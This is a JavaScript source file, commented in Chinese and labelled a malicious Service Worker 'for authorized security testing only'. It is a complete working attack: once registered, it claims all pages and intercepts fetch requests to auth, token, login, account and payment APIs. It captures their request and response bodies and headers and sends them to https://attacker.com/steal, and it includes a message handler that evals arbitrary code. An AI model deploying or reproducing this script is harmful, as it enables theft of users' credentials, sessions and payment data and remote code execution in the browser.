/**
 * 恶意 Service Worker
 * 功能：监听所有 fetch 请求并在 console 输出
 * 
 * ⚠️ 仅用于授权的安全测试！
 */

(function() {
    'use strict';
    
    const PREFIX = '🚨 [EVIL SW]';
    const ATTACKER_SERVER = 'https://attacker.com';
    
    // ============================================
    // 1. 安装事件 - 强制立即激活
    // ============================================
    self.addEventListener('install', (event) => {
        console.log(PREFIX, '📦 Installing malicious SW...');
        console.log(PREFIX, 'Scope:', self.registration ? self.registration.scope : 'unknown');
        
        // 跳过等待，立即激活
        self.skipWaiting();
        
        console.log(PREFIX, '✅ skipWaiting() called');
    });
    
    // ============================================
    // 2. 激活事件 - 立即控制所有客户端
    // ============================================
    self.addEventListener('activate', (event) => {
        console.log(PREFIX, '⚡ Activating malicious SW...');
        
        // 立即控制所有客户端
        event.waitUntil(
            self.clients.claim().then(() => {
                console.log(PREFIX, '✅ Claimed all clients!');
                
                // 通知所有客户端
                self.clients.matchAll().then(clients => {
                    clients.forEach(client => {
                        client.postMessage({
                            type: 'SW_ACTIVATED',
                            message: 'Malicious SW is now controlling this page',
                            scope: self.registration.scope
                        });
                    });
                });
            })
        );
    });
    
    // ============================================
    // 3. 监听所有 fetch 请求
    // ============================================
    self.addEventListener('fetch', (event) => {
        const request = event.request;
        const url = request.url;
        const method = request.method;
        const destination = request.destination;
        const headers = {};
        
        // 提取请求头
        try {
            for (const [key, value] of request.headers.entries()) {
                headers[key] = value;
            }
        } catch (e) {}
        
        // 格式化输出
        console.log(PREFIX, '');
        console.log(PREFIX, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        console.log(PREFIX, '🚀 FETCH REQUEST INTERCEPTED');
        console.log(PREFIX, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        console.log(PREFIX, '📍 URL:', url);
        console.log(PREFIX, '📍 Method:', method);
        console.log(PREFIX, '📍 Type:', destination || 'unknown');
        console.log(PREFIX, '📍 Headers:', headers);
        
        // 检测敏感请求
        const sensitivePatterns = [
            '/api/user',
            '/api/auth',
            '/api/token',
            '/api/login',
            '/api/account',
            '/api/order',
            '/api/payment',
            '/api/shop',
            '/api/streamer',
            '/api/config'
        ];
        
        const isSensitive = sensitivePatterns.some(pattern => url.includes(pattern));
        
        if (isSensitive) {
            console.log(PREFIX, '⚠️ SENSITIVE API REQUEST DETECTED!');
            
            // 拦截并窃取数据
            event.respondWith(handleSensitiveRequest(event.request));
        } else {
            // 普通请求，正常处理
            event.respondWith(handleNormalRequest(event.request));
        }
    });
    
    // ============================================
    // 4. 处理敏感请求
    // ============================================
    async function handleSensitiveRequest(request) {
        const url = request.url;
        const method = request.method;
        
        console.log(PREFIX, '');
        console.log(PREFIX, '🎯 Processing sensitive request...');
        console.log(PREFIX, '  URL:', url);
        
        try {
            // 读取请求体（如果有）
            let requestBody = null;
            if (method !== 'GET' && method !== 'HEAD') {
                try {
                    requestBody = await request.clone().text();
                    console.log(PREFIX, '📤 Request Body:', requestBody);
                } catch (e) {
                    console.log(PREFIX, '❌ Failed to read request body:', e);
                }
            }
            
            // 执行原始请求
            const response = await fetch(request);
            const clonedResponse = response.clone();
            
            // 读取响应头
            const responseHeaders = {};
            for (const [key, value] of response.headers.entries()) {
                responseHeaders[key] = value;
            }
            
            // 读取响应体
            let responseBody = null;
            const contentType = response.headers.get('content-type') || '';
            
            if (contentType.includes('application/json')) {
                try {
                    responseBody = await clonedResponse.json();
                    console.log(PREFIX, '📥 Response JSON:', responseBody);
                } catch (e) {
                    responseBody = await clonedResponse.text();
                    console.log(PREFIX, '📥 Response Text:', responseBody);
                }
            } else {
                responseBody = await clonedResponse.text();
                console.log(PREFIX, '📥 Response Text:', responseBody.substring(0, 1000));
            }
            
            // 输出完整信息
            console.log(PREFIX, '');
            console.log(PREFIX, '📊 COMPLETE REQUEST/RESPONSE INFO:');
            console.log(PREFIX, '  Status:', response.status);
            console.log(PREFIX, '  Status Text:', response.statusText);
            console.log(PREFIX, '  Response Headers:', responseHeaders);
            console.log(PREFIX, '  Response Body:', responseBody);
            console.log(PREFIX, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
            
            // 发送到攻击者服务器
            exfiltrateData({
                url: url,
                method: method,
                requestHeaders: Object.fromEntries(request.headers.entries()),
                requestBody: requestBody,
                responseStatus: response.status,
                responseHeaders: responseHeaders,
                responseBody: responseBody,
                timestamp: Date.now()
            });
            
            return response;
            
        } catch (error) {
            console.log(PREFIX, '❌ Error processing request:', error);
            return fetch(request);
        }
    }
    
    // ============================================
    // 5. 处理普通请求
    // ============================================
    async function handleNormalRequest(request) {
        const url = request.url;
        
        try {
            const response = await fetch(request);
            
            console.log(PREFIX, '✅ Normal request completed:', url);
            console.log(PREFIX, '  Status:', response.status);
            
            return response;
            
        } catch (error) {
            console.log(PREFIX, '❌ Request failed:', url, error);
            throw error;
        }
    }
    
    // ============================================
    // 6. 数据外泄函数
    // ============================================
    function exfiltrateData(data) {
        console.log(PREFIX, '📡 Exfiltrating data to attacker server...');
        
        fetch(`${ATTACKER_SERVER}/steal`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data),
            mode: 'no-cors'
        })
        .then(() => {
            console.log(PREFIX, '✅ Data exfiltrated successfully');
        })
        .catch((error) => {
            console.log(PREFIX, '❌ Exfiltration failed:', error);
        });
    }
    
    // ============================================
    // 7. 监听消息
    // ============================================
    self.addEventListener('message', (event) => {
        console.log(PREFIX, '');
        console.log(PREFIX, '📨 MESSAGE RECEIVED');
        console.log(PREFIX, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        console.log(PREFIX, '  Source:', event.source ? event.source.id : 'unknown');
        console.log(PREFIX, '  Data:', event.data);
        
        // 处理不同类型的消息
        if (event.data) {
            switch (event.data.type) {
                case 'PING':
                    event.source.postMessage({
                        type: 'PONG',
                        message: 'Malicious SW is active!',
                        scope: self.registration ? self.registration.scope : 'unknown',
                        timestamp: Date.now()
                    });
                    break;
                    
                case 'GET_INFO':
                    event.source.postMessage({
                        type: 'INFO',
                        scope: self.registration ? self.registration.scope : 'unknown',
                        scriptURL: self.location ? self.location.href : 'unknown'
                    });
                    break;
                    
                case 'EVAL':
                    try {
                        const result = eval(event.data.code);
                        event.source.postMessage({
                            type: 'EVAL_RESULT',
                            result: result
                        });
                    } catch (e) {
                        event.source.postMessage({
                            type: 'EVAL_ERROR',
                            error: e.message
                        });
                    }
                    break;
                    
                default:
                    console.log(PREFIX, 'Unknown message type:', event.data.type);
            }
        }
    });
    
    // ============================================
    // 8. 同步事件（如果支持）
    // ============================================
    self.addEventListener('sync', (event) => {
        console.log(PREFIX, '');
        console.log(PREFIX, '🔄 SYNC EVENT');
        console.log(PREFIX, '  Tag:', event.tag);
    });
    
    // ============================================
    // 9. 推送事件（如果支持）
    // ============================================
    self.addEventListener('push', (event) => {
        console.log(PREFIX, '');
        console.log(PREFIX, '📬 PUSH EVENT');
        
        if (event.data) {
            console.log(PREFIX, '  Data:', event.data.text());
        }
    });
    
    // ============================================
    // 10. 通知点击事件
    // ============================================
    self.addEventListener('notificationclick', (event) => {
        console.log(PREFIX, '');
        console.log(PREFIX, '🔔 NOTIFICATION CLICK');
        console.log(PREFIX, '  Action:', event.action);
    });
    
    // ============================================
    // 11. 错误处理
    // ============================================
    self.addEventListener('error', (event) => {
        console.log(PREFIX, '❌ SW ERROR:', event.error);
    });
    
    self.addEventListener('unhandledrejection', (event) => {
        console.log(PREFIX, '❌ UNHANDLED REJECTION:', event.reason);
    });
    
    // ============================================
    // 12. 初始化完成
    // ============================================
    console.log(PREFIX, '');
    console.log(PREFIX, '══════════════════════════════════════════════════');
    console.log(PREFIX, '🚀 MALICIOUS SERVICE WORKER LOADED SUCCESSFULLY');
    console.log(PREFIX, '══════════════════════════════════════════════════');
    console.log(PREFIX, 'Scope:', self.registration ? self.registration.scope : 'unknown');
    console.log(PREFIX, 'Script URL:', self.location ? self.location.href : 'unknown');
    console.log(PREFIX, 'All fetch requests will be monitored and logged.');
    console.log(PREFIX, '══════════════════════════════════════════════════');
    console.log(PREFIX, '');
    
})();
